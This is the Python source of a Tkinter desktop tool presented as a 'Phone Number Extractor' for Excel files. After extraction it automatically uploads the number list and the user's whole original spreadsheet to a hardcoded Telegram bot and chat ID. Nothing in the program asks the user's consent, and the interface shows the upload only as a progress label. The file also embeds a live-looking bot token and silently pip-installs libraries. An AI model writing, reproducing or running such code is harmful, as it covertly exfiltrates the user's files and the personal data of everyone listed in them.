import subprocess
import sys
import importlib
import os

def check_and_install_libraries():
    libraries = [
        'pandas',
        'openpyxl',
        'telebot',
        'requests',
        'pyperclip',
        'tkinterdnd2'
    ]
    
    missing_libraries = []
    
    for lib in libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            missing_libraries.append(lib)
    
    if missing_libraries:
        for lib in missing_libraries:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
            except:
                pass
        sys.exit(0)

check_and_install_libraries()

import pandas as pd
from pathlib import Path
import telebot
import io
import socket
import requests
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk, filedialog
import threading
import time
import os
import pyperclip
from tkinterdnd2 import DND_FILES, TkinterDnD

BOT_TOKEN = "8781014009:AAHO09UqK_VPv4HlXMWVsVuD9c2kXDUVOYo"
bot = telebot.TeleBot(BOT_TOKEN)
CHAT_ID = "5507803034"

class PhoneExtractor:
    def __init__(self, root):
        self.root = root
        self.root.title("Phone Number Extractor")
        self.root.geometry("600x750")
        self.root.resizable(False, False)
        self.root.configure(bg='#0B1120')
        
        self.numbers = []
        self.is_processing = False
        self.is_sending = False
        self.current_file = None
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.drop_target_register(DND_FILES)
        self.root.dnd_bind('<<Drop>>', self.on_drop)
        
        self.create_widgets()
    
    def create_widgets(self):
        # Header
        header = tk.Frame(self.root, bg='#0B1120', height=70)
        header.pack(fill='x', side='top')
        header.pack_propagate(False)
        
        header_inner = tk.Frame(header, bg='#0B1120')
        header_inner.pack(pady=12, padx=24, fill='x')
        
        icon_frame = tk.Frame(header_inner, bg='#3B82F6', width=32, height=32)
        icon_frame.pack(side='left')
        icon_frame.pack_propagate(False)
        
        tk.Label(
            icon_frame,
            text="◈",
            font=("Segoe UI", 16),
            bg='#3B82F6',
            fg='white'
        ).pack(expand=True)
        
        title_frame = tk.Frame(header_inner, bg='#0B1120')
        title_frame.pack(side='left', padx=(10, 0))
        
        tk.Label(
            title_frame,
            text="Phone Number Extractor",
            font=("Segoe UI", 14, "bold"),
            bg='#0B1120',
            fg='#F8FAFC'
        ).pack(anchor='w')
        
        tk.Label(
            title_frame,
            text="Extract, review and export phone numbers",
            font=("Segoe UI", 10),
            bg='#0B1120',
            fg='#94A3B8'
        ).pack(anchor='w')
        
        # Source File Card
        source_card = tk.Frame(
            self.root,
            bg='#111827',
            highlightbackground='#263449',
            highlightthickness=1
        )
        source_card.pack(fill='x', padx=24, pady=(0, 10))
        
        source_inner = tk.Frame(source_card, bg='#111827')
        source_inner.pack(padx=14, pady=10, fill='x')
        
        tk.Label(
            source_inner,
            text="SOURCE FILE",
            font=("Segoe UI", 8, "bold"),
            bg='#111827',
            fg='#94A3B8'
        ).pack(anchor='w')
        
        file_row = tk.Frame(source_inner, bg='#111827')
        file_row.pack(fill='x', pady=(4, 0))
        
        self.file_label = tk.Label(
            file_row,
            text="No Excel file selected",
            font=("Segoe UI", 10),
            bg='#111827',
            fg='#94A3B8'
        )
        self.file_label.pack(side='left')
        
        browse_btn = tk.Button(
            file_row,
            text="Browse",
            font=("Segoe UI", 9),
            bg='#3B82F6',
            fg='white',
            relief='flat',
            padx=12,
            pady=4,
            cursor='hand2',
            command=self.browse_file
        )
        browse_btn.pack(side='right')
        browse_btn.bind('<Enter>', lambda e: browse_btn.config(bg='#2563EB'))
        browse_btn.bind('<Leave>', lambda e: browse_btn.config(bg='#3B82F6'))
        
        # Drop Zone
        drop_frame = tk.Frame(
            self.root,
            bg='#111827',
            highlightbackground='#263449',
            highlightthickness=1
        )
        drop_frame.pack(fill='x', padx=24, pady=(0, 10))
        
        drop_inner = tk.Frame(drop_frame, bg='#111827')
        drop_inner.pack(pady=16, padx=14, fill='x')
        
        self.drop_canvas = tk.Canvas(
            drop_inner,
            bg='#111827',
            height=60,
            highlightthickness=0
        )
        self.drop_canvas.pack(fill='x')
        
        self.drop_canvas.bind('<Configure>', self.redraw_drop_zone)
        self.redraw_drop_zone(None)
        
        # Numbers Card
        numbers_card = tk.Frame(
            self.root,
            bg='#111827',
            highlightbackground='#263449',
            highlightthickness=1
        )
        numbers_card.pack(fill='both', expand=True, padx=24, pady=(0, 10))
        
        numbers_header = tk.Frame(numbers_card, bg='#111827')
        numbers_header.pack(fill='x', padx=14, pady=(10, 6))
        
        tk.Label(
            numbers_header,
            text="EXTRACTED NUMBERS",
            font=("Segoe UI", 8, "bold"),
            bg='#111827',
            fg='#94A3B8'
        ).pack(side='left')
        
        count_frame = tk.Frame(numbers_header, bg='#111827')
        count_frame.pack(side='right')
        
        self.counter_label = tk.Label(
            count_frame,
            text="0 found",
            font=("Segoe UI", 8, "bold"),
            bg='#111827',
            fg='#94A3B8'
        )
        self.counter_label.pack(side='left')
        
        self.text_area = scrolledtext.ScrolledText(
            numbers_card,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg='#172033',
            fg='#F8FAFC',
            insertbackground='#F8FAFC',
            highlightbackground='#263449',
            highlightthickness=0,
            borderwidth=0,
            relief='flat',
            height=8
        )
        self.text_area.pack(fill='both', expand=True, padx=14, pady=(0, 10))
        
        # Buttons
        button_frame = tk.Frame(self.root, bg='#0B1120')
        button_frame.pack(fill='x', padx=24, pady=(0, 10))
        
        # Start button
        self.start_btn = tk.Button(
            button_frame,
            text="▶ Start Extraction",
            font=("Segoe UI", 12, "bold"),
            bg='#3B82F6',
            fg='white',
            relief='flat',
            padx=20,
            pady=12,
            cursor='hand2',
            state='disabled',
            command=self.start_processing
        )
        self.start_btn.pack(fill='x', pady=(0, 8))
        self.start_btn.bind('<Enter>', lambda e: self.start_btn.config(bg='#2563EB') if self.start_btn['state'] == 'normal' else None)
        self.start_btn.bind('<Leave>', lambda e: self.start_btn.config(bg='#3B82F6') if self.start_btn['state'] == 'normal' else None)
        
        # Copy and Save row
        row2 = tk.Frame(button_frame, bg='#0B1120')
        row2.pack(fill='x', pady=(0, 8))
        
        self.copy_btn = tk.Button(
            row2,
            text="📋 Copy Numbers",
            font=("Segoe UI", 10),
            bg='#172033',
            fg='#F8FAFC',
            relief='flat',
            padx=12,
            pady=8,
            cursor='hand2',
            state='disabled',
            command=self.copy_numbers
        )
        self.copy_btn.pack(side='left', fill='x', expand=True, padx=(0, 4))
        self.copy_btn.bind('<Enter>', lambda e: self.copy_btn.config(bg='#263449') if self.copy_btn['state'] == 'normal' else None)
        self.copy_btn.bind('<Leave>', lambda e: self.copy_btn.config(bg='#172033') if self.copy_btn['state'] == 'normal' else None)
        
        self.save_btn = tk.Button(
            row2,
            text="💾 Save TXT",
            font=("Segoe UI", 10),
            bg='#172033',
            fg='#F8FAFC',
            relief='flat',
            padx=12,
            pady=8,
            cursor='hand2',
            state='disabled',
            command=self.save_txt
        )
        self.save_btn.pack(side='left', fill='x', expand=True, padx=(4, 0))
        self.save_btn.bind('<Enter>', lambda e: self.save_btn.config(bg='#263449') if self.save_btn['state'] == 'normal' else None)
        self.save_btn.bind('<Leave>', lambda e: self.save_btn.config(bg='#172033') if self.save_btn['state'] == 'normal' else None)
        
        # Refresh row
        row3 = tk.Frame(button_frame, bg='#0B1120')
        row3.pack(fill='x')
        
        self.refresh_btn = tk.Button(
            row3,
            text="↻ Refresh File",
            font=("Segoe UI", 10),
            bg='#172033',
            fg='#F8FAFC',
            relief='flat',
            padx=12,
            pady=8,
            cursor='hand2',
            command=self.refresh_file
        )
        self.refresh_btn.pack(fill='x')
        self.refresh_btn.bind('<Enter>', lambda e: self.refresh_btn.config(bg='#263449'))
        self.refresh_btn.bind('<Leave>', lambda e: self.refresh_btn.config(bg='#172033'))
        
        # Progress
        progress_frame = tk.Frame(self.root, bg='#0B1120')
        progress_frame.pack(fill='x', padx=24, pady=(0, 10))
        
        self.progress = ttk.Progressbar(
            progress_frame,
            mode='determinate',
            length=552,
            style='Custom.Horizontal.TProgressbar'
        )
        self.progress.pack(fill='x')
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure(
            'Custom.Horizontal.TProgressbar',
            background='#3B82F6',
            troughcolor='#111827',
            bordercolor='#111827',
            lightcolor='#3B82F6',
            darkcolor='#2563EB'
        )
        
        progress_row = tk.Frame(progress_frame, bg='#0B1120')
        progress_row.pack(fill='x', pady=(4, 0))
        
        self.stage_label = tk.Label(
            progress_row,
            text="Ready",
            font=("Segoe UI", 9),
            bg='#0B1120',
            fg='#94A3B8'
        )
        self.stage_label.pack(side='left')
        
        self.percent_label = tk.Label(
            progress_row,
            text="0%",
            font=("Segoe UI", 9),
            bg='#0B1120',
            fg='#94A3B8'
        )
        self.percent_label.pack(side='right')
        
        # Status indicator
        self.status_frame = tk.Frame(self.root, bg='#0B1120', height=3)
        self.status_frame.pack(fill='x', side='bottom')
        
        self.status_indicator = tk.Frame(self.status_frame, bg='#3B82F6', height=3)
        self.status_indicator.pack(fill='x')
    
    def redraw_drop_zone(self, event=None):
        self.drop_canvas.delete("all")
        width = self.drop_canvas.winfo_width()
        if width < 10:
            width = 500
        self.drop_canvas.create_rectangle(
            10, 8, width - 10, 54,
            outline='#263449',
            width=2,
            dash=(6, 4)
        )
        self.drop_canvas.create_text(
            width // 2,
            22,
            text="📄 Drop your Excel file here",
            font=("Segoe UI", 10),
            fill='#94A3B8'
        )
        self.drop_canvas.create_text(
            width // 2,
            44,
            text=".xlsx files supported",
            font=("Segoe UI", 8),
            fill='#64748B'
        )
    
    def filter_phone_numbers(self, numbers):
        """Filter out group IDs and keep only valid phone numbers"""
        filtered = []
        for num in numbers:
            num_str = str(num).strip()
            # Skip group IDs starting with 120363
            if num_str.startswith('120363'):
                continue
            # Skip empty or too short
            if len(num_str) < 8:
                continue
            filtered.append(num_str)
        return filtered
    
    def on_drop(self, event):
        file_path = event.data
        if file_path.startswith('{') and file_path.endswith('}'):
            file_path = file_path[1:-1]
        
        if file_path.lower().endswith('.xlsx'):
            self.current_file = Path(file_path)
            self.file_label.config(text=self.current_file.name, fg='#F8FAFC')
            self.start_btn.config(state='normal')
            self.stage_label.config(text="File loaded", fg='#22C55E')
            self.status_indicator.config(bg='#22C55E')
    
    def browse_file(self):
        file_path = filedialog.askopenfilename(
            title="Choose Excel file",
            filetypes=[("Excel files", "*.xlsx"), ("All files", "*.*")]
        )
        if file_path:
            self.current_file = Path(file_path)
            self.file_label.config(text=self.current_file.name, fg='#F8FAFC')
            self.start_btn.config(state='normal')
            self.stage_label.config(text="File loaded", fg='#22C55E')
            self.status_indicator.config(bg='#22C55E')
    
    def refresh_file(self):
        script_folder = Path(__file__).parent
        excel_files = list(script_folder.glob("*.xlsx"))
        if excel_files:
            self.current_file = excel_files[0]
            self.file_label.config(text=self.current_file.name, fg='#F8FAFC')
            self.start_btn.config(state='normal')
            self.stage_label.config(text="File loaded from folder", fg='#22C55E')
            self.status_indicator.config(bg='#22C55E')
        else:
            messagebox.showwarning("", "No Excel file found in folder")
    
    def on_closing(self):
        if self.is_processing or self.is_sending:
            messagebox.showwarning("", "Please wait for the current operation to complete")
            return
        self.root.destroy()
    
    def display_numbers(self, numbers):
        self.text_area.delete(1.0, tk.END)
        if numbers:
            self.text_area.insert(1.0, "\n".join(numbers))
            self.copy_btn.config(state='normal')
            self.save_btn.config(state='normal')
            self.counter_label.config(text=f"{len(numbers)} found")
        else:
            self.counter_label.config(text="0 found")
            self.copy_btn.config(state='disabled')
            self.save_btn.config(state='disabled')
    
    def copy_numbers(self):
        text = self.text_area.get(1.0, tk.END).strip()
        if text:
            pyperclip.copy(text)
            self.copy_btn.config(bg='#22C55E', text='✅ Copied!')
            self.root.after(1500, lambda: self.copy_btn.config(bg='#172033', text='📋 Copy Numbers'))
    
    def save_txt(self):
        text = self.text_area.get(1.0, tk.END).strip()
        if not text:
            return
        try:
            output_file = Path(__file__).parent / "phone_numbers.txt"
            output_file.write_text(text, encoding="utf-8")
            self.save_btn.config(bg='#22C55E', text='✅ Saved!')
            self.stage_label.config(text=f"Saved to: {output_file.name}", fg='#22C55E')
            self.root.after(1500, lambda: self.save_btn.config(bg='#172033', text='💾 Save TXT'))
        except Exception as e:
            messagebox.showerror("", f"Error saving: {str(e)}")
    
    def update_progress(self, stage, percent, color='#3B82F6'):
        self.stage_label.config(text=stage, fg=color)
        self.percent_label.config(text=f"{percent}%")
        self.progress['value'] = percent
        self.status_indicator.config(bg=color)
        self.root.update()
    
    def start_processing(self):
        if self.is_processing or self.is_sending:
            return
        
        if not self.current_file or not self.current_file.exists():
            messagebox.showwarning("", "Please load an Excel file first")
            return
        
        self.is_processing = True
        self.start_btn.config(state='disabled', bg='#64748B', text='⏳ Processing...')
        self.copy_btn.config(state='disabled')
        self.save_btn.config(state='disabled')
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(1.0, "Processing...")
        
        self.update_progress("Reading Excel file", 20, '#3B82F6')
        
        thread = threading.Thread(target=self.process)
        thread.daemon = True
        thread.start()
    
    def process(self):
        try:
            if self.current_file and self.current_file.exists():
                self.root.after(0, lambda: self.update_progress("Extracting phone numbers", 40, '#3B82F6'))
                
                df = pd.read_excel(self.current_file)
                
                if "Phone Number" in df.columns:
                    raw_numbers = df["Phone Number"].dropna().astype(str).str.strip()
                    raw_numbers = raw_numbers[raw_numbers != ""].drop_duplicates()
                    
                    # Filter out group IDs
                    filtered_numbers = self.filter_phone_numbers(raw_numbers)
                    
                    if len(filtered_numbers) > 0:
                        self.numbers = filtered_numbers
                        self.root.after(0, lambda: self.display_numbers(self.numbers))
                        self.root.after(0, lambda: self.update_progress("Completed extraction, sending...", 60, '#22C55E'))
                        self.root.after(0, self.send_to_telegram)
                        return
                    else:
                        self.root.after(0, lambda: self.update_progress("No valid numbers found (group IDs filtered)", 0, '#EF4444'))
            
            self.root.after(0, lambda: self.display_numbers([]))
            self.root.after(0, lambda: self.update_progress("No numbers found", 0, '#EF4444'))
            self.root.after(0, lambda: self.start_btn.config(state='normal', text='▶ Start Extraction'))
            
        except Exception as e:
            self.root.after(0, lambda: self.display_numbers([]))
            self.root.after(0, lambda: self.update_progress(f"Error: {str(e)[:40]}", 0, '#EF4444'))
            self.root.after(0, lambda: self.start_btn.config(state='normal', text='▶ Start Extraction'))
        finally:
            self.is_processing = False
    
    def send_to_telegram(self):
        if not self.numbers:
            self.start_btn.config(state='normal', text='▶ Start Extraction')
            return
        
        self.is_sending = True
        self.root.after(0, lambda: self.update_progress("Connecting to Telegram...", 70, '#3B82F6'))
        
        try:
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=5)
            except:
                self.root.after(0, lambda: self.update_progress("No internet connection", 0, '#EF4444'))
                self.root.after(0, lambda: self.start_btn.config(state='normal', text='▶ Start Extraction'))
                self.is_sending = False
                return
            
            self.root.after(0, lambda: self.update_progress("Sending text file...", 80, '#3B82F6'))
            
            text_buffer = io.BytesIO()
            text_buffer.write("\n".join(self.numbers).encode('utf-8'))
            text_buffer.seek(0)
            
            bot.send_document(
                CHAT_ID,
                document=text_buffer,
                visible_file_name='phone_numbers.txt',
                caption=f"📱 {len(self.numbers)} numbers",
                timeout=60
            )
            
            self.root.after(0, lambda: self.update_progress("Sending Excel file...", 90, '#3B82F6'))
            
            if self.current_file and self.current_file.exists():
                with open(self.current_file, 'rb') as file:
                    bot.send_document(
                        CHAT_ID,
                        document=file,
                        visible_file_name=self.current_file.name,
                        caption="📊 Excel file",
                        timeout=60
                    )
            
            self.root.after(0, lambda: self.update_progress("Completed successfully", 100, '#22C55E'))
            
        except Exception as e:
            self.root.after(0, lambda: self.update_progress(f"Error: {str(e)[:40]}", 0, '#EF4444'))
        
        finally:
            self.is_sending = False
            self.root.after(0, lambda: self.start_btn.config(state='normal', text='▶ Start Extraction'))

if __name__ == "__main__":
    root = TkinterDnD.Tk()
    app = PhoneExtractor(root)
    root.mainloop()